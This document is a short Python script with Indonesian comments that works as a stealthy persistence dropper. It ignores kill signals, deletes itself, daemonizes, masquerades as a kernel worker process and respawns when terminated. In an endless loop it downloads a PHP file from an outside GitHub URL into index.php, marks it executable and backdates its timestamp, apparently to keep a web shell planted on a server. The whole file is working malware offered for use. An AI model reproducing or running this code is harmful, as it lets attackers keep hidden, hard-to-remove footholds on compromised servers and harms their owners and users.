import os
import sys
import time
import signal
import ctypes

# Fungsi untuk mengabaikan sinyal kill
def ignore_signal(signum, frame):
    print(f"Ignoring signal: {signum}")

# Abaikan sinyal yang umum digunakan untuk menghentikan proses
for sig in [signal.SIGTERM, signal.SIGINT, signal.SIGHUP]:
    signal.signal(sig, ignore_signal)

# Fungsi untuk menghapus dirinya sendiri setelah dijalankan
def self_delete():
    try:
        os.remove(sys.argv[0])
    except:
        pass

# Fungsi untuk menjalankan sebagai daemon (background process)
def daemonize():
    pid = os.fork()
    if pid > 0:
        sys.exit()  # Parent keluar, child lanjut berjalan

    os.setsid()  # Membuat session baru

    pid = os.fork()
    if pid > 0:
        sys.exit()  # Parent keluar lagi, hanya child yang lanjut

    sys.stdout = open("/dev/null", "w")
    sys.stderr = open("/dev/null", "w")
    os.close(0)  # stdin
    os.close(1)  # stdout
    os.close(2)  # stderr

# Fungsi untuk mengubah nama proses agar terlihat seperti proses sistem
def rename_process():
    try:
        libc = ctypes.CDLL("libc.so.6")
        libc.prctl(15, b"[kworker/u16:2]", 0, 0, 0)
    except:
        pass

# Fungsi untuk memastikan script selalu hidup (auto-respawn)
def respawn():
    while True:
        pid = os.fork()
        if pid == 0:  # Child process tetap berjalan
            rename_process()
            break
        else:
            os.waitpid(pid, 0)  # Parent menunggu child mati, lalu respawn

# URL sumber file yang akan diunduh
url = "https://raw.githubusercontent.com/sztsss/m4nMan/refs/heads/main/program.php"
file_name = "index.php"
timestamp = "201201081531.12"

# Jalankan fungsi penting
self_delete()    # Hapus file setelah dijalankan
daemonize()      # Jadikan proses daemon (background)
respawn()        # Aktifkan auto-respawn jika terbunuh
rename_process() # Rename proses agar lebih tersembunyi

# Loop utama untuk mengunduh & mempertahankan file
while True:
    os.system(f"curl {url} -o {file_name}")
    os.system(f"chmod 0755 {file_name}")
    os.system(f"touch -t {timestamp} {file_name}")  # Menjaga timestamp tetap

    for _ in range(10):
        os.system(f"chmod 0755 {file_name}")
        os.system(f"touch -t {timestamp} {file_name}")  
        time.sleep(1)

    time.sleep(5)
